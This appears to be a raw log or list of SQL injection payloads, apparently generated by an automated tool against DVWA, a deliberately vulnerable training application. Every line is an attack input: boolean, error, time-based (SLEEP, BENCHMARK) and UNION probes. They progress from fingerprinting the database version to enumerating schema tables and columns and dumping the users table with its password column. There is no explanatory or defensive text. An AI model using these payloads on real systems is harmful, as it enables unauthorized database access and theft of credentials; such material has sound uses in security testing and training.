"3'("")(,.)(."
"3'mlZrxY<'"">SGmdWr"
3) AND 9170=3277-- rSTX
3) AND 1679=1679-- UqZw
3') AND 4768=1152-- ptuC
3') AND 1679=1679-- UEUc
3' AND 4170=2773-- iUfa
3' AND 1679=1679-- Jmnp
"3"" AND 2389=1482-- eLdg"
"3"" AND 1679=1679-- grCS"
3) AND 5661=2362 AND (9573=9573
3) AND 1679=1679 AND (2545=2545
3)) AND 8697=4070 AND ((6741=6741
3)) AND 1679=1679 AND ((8077=8077
3))) AND 3993=5061 AND (((7341=7341
3))) AND 1679=1679 AND (((7151=7151
3 AND 4409=3181
3 AND 1679=1679
3 AND 4113=9896
3') AND 2369=9391 AND ('ClvK'='ClvK
3') AND 1679=1679 AND ('UhdV'='UhdV
3')) AND 9479=2913 AND (('vIPS'='vIPS
3')) AND 1679=1679 AND (('cwpW'='cwpW
3'))) AND 7686=5210 AND ((('iOjj'='iOjj
3'))) AND 1679=1679 AND ((('ARfh'='ARfh
3' AND 2174=4072 AND 'fJxK'='fJxK
3' AND 1679=1679 AND 'ilDQ'='ilDQ
3') AND 1879=4348 AND ('LCFv' LIKE 'LCFv
3') AND 1679=1679 AND ('vwhE' LIKE 'vwhE
3')) AND 1406=3730 AND (('zLvV' LIKE 'zLvV
3')) AND 1679=1679 AND (('sZfP' LIKE 'sZfP
3'))) AND 1552=8625 AND ((('NXPc' LIKE 'NXPc
3'))) AND 1679=1679 AND ((('eUdv' LIKE 'eUdv
3%' AND 6444=5833 AND 'yEUg%'='yEUg
3%' AND 1679=1679 AND 'Pczx%'='Pczx
3' AND 9585=3172 AND 'MOZr' LIKE 'MOZr
3' AND 1679=1679 AND 'GZoE' LIKE 'GZoE
"3"") AND 3448=9940 AND (""tPMz""=""tPMz"
"3"") AND 1679=1679 AND (""tnED""=""tnED"
"3"")) AND 3048=1945 AND ((""eNMZ""=""eNMZ"
"3"")) AND 1679=1679 AND ((""vDEU""=""vDEU"
"3""))) AND 2702=1806 AND (((""dLXo""=""dLXo"
"3""))) AND 1679=1679 AND (((""DtEe""=""DtEe"
"3"" AND 2853=8188 AND ""JqmW""=""JqmW"
"3"" AND 1679=1679 AND ""cVAz""=""cVAz"
"3"") AND 6968=4884 AND (""vCrK"" LIKE ""vCrK"
"3"") AND 1679=1679 AND (""XhVt"" LIKE ""XhVt"
"3"")) AND 5918=5702 AND ((""aEuC"" LIKE ""aEuC"
"3"")) AND 1679=1679 AND ((""LTkl"" LIKE ""LTkl"
"3""))) AND 5418=5730 AND (((""hJNa"" LIKE ""hJNa"
"3""))) AND 1679=1679 AND (((""fAFz"" LIKE ""fAFz"
"3"" AND 4727=4142 AND ""bpUw"" LIKE ""bpUw"
"3"" AND 1679=1679 AND ""DYHe"" LIKE ""DYHe"
3 AND 3507=2582-- iUGg
3 AND 1679=1679-- Iysz
3 AND 8620=1572-- kEcD
3 AND 9764=6546# MeyL
3 AND 1679=1679# jfAv
3 AND 4441=6893# vVwt
3' AND 9597=5971 OR 'sTKo'='apqM
3' AND 1679=1679 OR 'nrFG'='vZQH
3') WHERE 9020=9020 AND 8690=2411-- rAFb
3') WHERE 7118=7118 AND 1679=1679-- cfHf
"3"") WHERE 7782=7782 AND 2263=4939-- sgkY"
"3"") WHERE 8879=8879 AND 1679=1679-- WsyC"
3) WHERE 3281=3281 AND 1721=5799-- FTNf
3) WHERE 4089=4089 AND 1679=1679-- uUNF
3' WHERE 3642=3642 AND 7768=7574-- exbW
3' WHERE 6168=6168 AND 1679=1679-- uQYI
"3"" WHERE 5427=5427 AND 8559=6296-- ZJCK"
"3"" WHERE 4935=4935 AND 1679=1679-- oGLm"
3 WHERE 7001=7001 AND 6673=1393-- VoWG
3 WHERE 6415=6415 AND 1679=1679-- ccwB
3'||(SELECT 0x49614a54 WHERE 2049=2049 AND 1251=4054)||'
3'||(SELECT 0x65536b47 WHERE 1418=1418 AND 1679=1679)||'
3'||(SELECT 0x4e576956 FROM DUAL WHERE 6373=6373 AND 6930=5660)||'
3'||(SELECT 0x794f714d FROM DUAL WHERE 2313=2313 AND 1679=1679)||'
3'+(SELECT 0x7a7a6a52 WHERE 2567=2567 AND 9755=2506)+'
3'+(SELECT 0x564e4349 WHERE 5428=5428 AND 1679=1679)+'
3||(SELECT 0x61565666 FROM DUAL WHERE 2385=2385 AND 7699=6117)||
3||(SELECT 0x54474356 FROM DUAL WHERE 8171=8171 AND 1679=1679)||
3||(SELECT 0x66634b76 WHERE 1537=1537 AND 2458=5204)||
3||(SELECT 0x724a6b75 WHERE 8287=8287 AND 1679=1679)||
3+(SELECT hvTA WHERE 3617=3617 AND 2362=3270)+
3+(SELECT CayR WHERE 1192=1192 AND 1679=1679)+
3+(SELECT 0x504a4a68 WHERE 6929=6929 AND 8710=8766)+
3+(SELECT 0x486d6c61 WHERE 9146=9146 AND 1679=1679)+
3')) AS zoCL WHERE 6700=6700 AND 8854=1634-- VmmH
3')) AS ALhD WHERE 8593=8593 AND 1679=1679-- kBIS
"3"")) AS vjCQ WHERE 8969=8969 AND 6039=3979-- qbSz"
"3"")) AS nkhV WHERE 9858=9858 AND 1679=1679-- SLML"
3)) AS dCfl WHERE 5674=5674 AND 7776=9581-- bGEI
3)) AS nPrF WHERE 6064=6064 AND 1679=1679-- aEfO
3') AS nBbS WHERE 2640=2640 AND 9359=2269-- fohF
3') AS fGya WHERE 4205=4205 AND 1679=1679-- SSzj
"3"") AS WHzs WHERE 3087=3087 AND 1946=4389-- wVIy"
"3"") AS QxDG WHERE 8971=8971 AND 1679=1679-- NkdQ"
3) AS uvRp WHERE 3366=3366 AND 7599=9629-- HfUl
3) AS tcXM WHERE 5162=5162 AND 1679=1679-- SuPQ
3` WHERE 3750=3750 AND 6426=2792-- MNLa
3` WHERE 3415=3415 AND 1679=1679-- nELV
3`) WHERE 1017=1017 AND 3215=6668-- DFXb
3`) WHERE 6710=6710 AND 1679=1679-- Ubtg
3`=`3` AND 4744=1745 AND `3`=`3
3`=`3` AND 1679=1679 AND `3`=`3
"3""=""3"" AND 8682=7799 AND ""3""=""3"
"3""=""3"" AND 1679=1679 AND ""3""=""3"
3]-(SELECT 0 WHERE 2519=2519 AND 2224=4800)|[3
3]-(SELECT 0 WHERE 6201=6201 AND 1679=1679)|[3
3' IN BOOLEAN MODE) AND 7996=3741#
3' IN BOOLEAN MODE) AND 1679=1679#
-1901
-4690) OR 3707=6708-- jjOd
-1321) OR 3355=3355-- goAG
-7099') OR 9793=3875-- YIbo
-3430') OR 3355=3355-- uzwf
-1110' OR 2770=4671-- JuBV
-5697' OR 3355=3355-- vCaR
"-1205"" OR 7704=4224-- GkLN"
"-6948"" OR 3355=3355-- wMYN"
-6681) OR 6325=6876 AND (1883=1883
-9725) OR 3355=3355 AND (5279=5279
-6212)) OR 4521=6232 AND ((1611=1611
-9531)) OR 3355=3355 AND ((4676=4676
-8231))) OR 7893=4854 AND (((2813=2813
-8144))) OR 3355=3355 AND (((6947=6947
-2156 OR 2576=4334
-2594 OR 3355=3355
-8395 OR 4667=6951
-4041 PxzRcTMAoc
-3448') OR 3067=8591 AND ('ffax'='ffax
-9858') OR 3355=3355 AND ('ebLk'='ebLk
-7596')) OR 1936=7086 AND (('yWox'='yWox
-3851')) OR 3355=3355 AND (('bklS'='bklS
-2284'))) OR 4962=9493 AND ((('QDJo'='QDJo
-1158'))) OR 3355=3355 AND ((('sUFk'='sUFk
-5134' OR 5829=3963 AND 'JPTe'='JPTe
-3611' OR 3355=3355 AND 'LIJh'='LIJh
-7235') OR 3606=1135 AND ('ijfE' LIKE 'ijfE
-2636') OR 3355=3355 AND ('qFnM' LIKE 'qFnM
-1189')) OR 7043=3754 AND (('uyRk' LIKE 'uyRk
-1879')) OR 3355=3355 AND (('SAGd' LIKE 'SAGd
-8883'))) OR 4651=4987 AND ((('oMOF' LIKE 'oMOF
-4480'))) OR 3355=3355 AND ((('CCJx' LIKE 'CCJx
-5003%' OR 4343=1596 AND 'yTZn%'='yTZn
-7146%' OR 3355=3355 AND 'RVIF%'='RVIF
-6710' OR 6252=2447 AND 'eaWA' LIKE 'eaWA
-1570' OR 3355=3355 AND 'GdBt' LIKE 'GdBt
"-7897"") OR 3547=1441 AND (""cqJH""=""cqJH"
"-7730"") OR 3355=3355 AND (""MiGg""=""MiGg"
"-4559"")) OR 3544=1735 AND ((""RlIO""=""RlIO"
"-4433"")) OR 3355=3355 AND ((""MugH""=""MugH"
"-7812""))) OR 3631=5653 AND (((""fazc""=""fazc"
"-6106""))) OR 3355=3355 AND (((""KlPZ""=""KlPZ"
"-9225"" OR 8771=7842 AND ""CMqV""=""CMqV"
"-1994"" OR 3355=3355 AND ""cjin""=""cjin"
"-4237"") OR 6406=1906 AND (""bLgT"" LIKE ""bLgT"
"-7424"") OR 3355=3355 AND (""fZih"" LIKE ""fZih"
"-3239"")) OR 2697=7161 AND ((""pDjg"" LIKE ""pDjg"
"-5459"")) OR 3355=3355 AND ((""gMMI"" LIKE ""gMMI"
"-6057""))) OR 7595=9363 AND (((""Vswr"" LIKE ""Vswr"
"-4087""))) OR 3355=3355 AND (((""jsxC"" LIKE ""jsxC"
"-8088"" OR 7970=7005 AND ""sWTV"" LIKE ""sWTV"
"-9754"" OR 3355=3355 AND ""vrWx"" LIKE ""vrWx"
-8590 OR 5422=1482-- InoS
-8289 OR 3355=3355-- aFgv
-1677 OR 6239=8630-- sHOE
-5909 PxzRcTMAoc-- FbMB
-5210 OR 7112=6192# TzGJ
-9029 OR 3355=3355# kHKS
-1460 OR 5815=1564# kSeH
-8459 PxzRcTMAoc# XVJz
-6838' OR 9328=2100 OR 'QDBQ'='MAxP
-7967' OR 3355=3355 OR 'wZIr'='yycM
-1796') WHERE 7195=7195 OR 2984=9066-- lxeQ
-2047') WHERE 4396=4396 OR 3355=3355-- YGPc
"-2086"") WHERE 2802=2802 OR 7471=4879-- iCSp"
"-1593"") WHERE 9753=9753 OR 3355=3355-- GuPD"
-7006) WHERE 1796=1796 OR 9999=7544-- YYFo
-8079) WHERE 4283=4283 OR 3355=3355-- zWdo
-6496' WHERE 1512=1512 OR 2428=5275-- QGiw
-5226' WHERE 3034=3034 OR 3355=3355-- Mwbq
"-4937"" WHERE 8596=8596 OR 9721=2664-- gaWX"
"-6851"" WHERE 5899=5899 OR 3355=3355-- cXDX"
-7747 WHERE 4170=4170 OR 9056=8656-- woaB
-9059 WHERE 3252=3252 OR 3355=3355-- xeWE
-8940')) AS XNbc WHERE 2758=2758 OR 9163=1008-- JaRN
-5346')) AS yQDm WHERE 2358=2358 OR 3355=3355-- AkoM
"-3819"")) AS kSbb WHERE 5270=5270 OR 3991=4839-- UfvX"
"-3655"")) AS UQNd WHERE 7975=7975 OR 3355=3355-- NSFs"
-4759)) AS pOfU WHERE 9195=9195 OR 5994=8186-- VHBc
-5022)) AS fZyX WHERE 5482=5482 OR 3355=3355-- QIiU
-8144') AS QOjy WHERE 5218=5218 OR 7181=8745-- GPMd
-5987') AS Ccoz WHERE 3546=3546 OR 3355=3355-- lBzq
"-2422"") AS FjFE WHERE 8152=8152 OR 7076=7490-- kgCB"
"-1204"") AS rvJX WHERE 6177=6177 OR 3355=3355-- cOIW"
-8943) AS ALRH WHERE 7095=7095 OR 2593=5400-- Hxtd
-1065) AS jVoP WHERE 9277=9277 OR 3355=3355-- xycH
3) OR NOT 4163=2012-- xmRR
3) OR NOT 5661=5661-- DcCi
3') OR NOT 1619=4178-- iItv
3') OR NOT 5661=5661-- rslb
3' OR NOT 1110=2364-- GnbX
3' OR NOT 5661=5661-- anLH
"3"" OR NOT 9514=9352-- tsda"
"3"" OR NOT 5661=5661-- MwdZ"
3) OR NOT 6799=6664 AND (4958=4958
3) OR NOT 5661=5661 AND (5798=5798
3)) OR NOT 6364=2042 AND ((1411=1411
3)) OR NOT 5661=5661 AND ((8457=8457
3))) OR NOT 1983=9070 AND (((7758=7758
3))) OR NOT 5661=5661 AND (((2370=2370
3 OR NOT 3674=4663
3 OR NOT 5661=5661
3 OR NOT 6902=7008
"(SELECT CONCAT(CONCAT(0x7176627a71,(CASE WHEN (2157=2157) THEN 0x31 ELSE 0x30 END)),0x716a7a6a71))"
"3 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176627a71,(SELECT (ELT(5348=5348,1))),0x716a7a6a71,0x78))s), 8446744073709551610, 8446744073709551610)))"
"(SELECT CONCAT(0x7176627a71,(ELT(6769=6769,1)),0x716a7a6a71))"
3;SELECT SLEEP(5)#
3;SELECT SLEEP(5)
3;(SELECT * FROM (SELECT(SLEEP(5)))FNpH)#
3;(SELECT * FROM (SELECT(SLEEP(5)))OwTD)
"3;SELECT BENCHMARK(5000000,MD5(0x54755357))#"
"3;SELECT BENCHMARK(5000000,MD5(0x78417443))"
3 AND (SELECT 7988 FROM (SELECT(SLEEP(5)))Bnmj)
3 AND (SELECT 7988 FROM (SELECT(SLEEP(0)))Bnmj)
3 AND (SELECT 7988 FROM (SELECT(SLEEP(5)))Bnmj)
3 ORDER BY 1-- -
3 ORDER BY 4860-- -
3 ORDER BY 10-- -
3 ORDER BY 6-- -
3 ORDER BY 4-- -
3 ORDER BY 3-- -
3 ORDER BY 2-- -
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL UNION ALL SELECT CONCAT(0x7176627a71,0x69574f714b6f78734659795058646870536f6e6f706267476f727a6d43616a506b4d4a47694e4349,0x716a7a6a71),NULL-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL FROM (SELECT 0 AS WRTt UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS ZkPF-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x716a7a6a71),NULL-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,table_name)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(table_name AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,column_name,column_type)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(column_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(column_type AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,`comment`,`name`,comment_id)),0x716a7a6a71),NULL FROM dvwa.guestbook-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(`comment` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(`name` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(comment_id AS CHAR),0x20),0x716a7a6a71),NULL FROM dvwa.guestbook-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,column_name,column_type)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(column_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(column_type AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,`user`,avatar,failed_login,first_name,last_login,last_name,password,user_id)),0x716a7a6a71),NULL FROM dvwa.users-- -"
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(`user` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(avatar AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(failed_login AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(first_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(last_login AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(last_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(password AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(user_id AS CHAR),0x20),0x716a7a6a71),NULL FROM dvwa.users-- -"
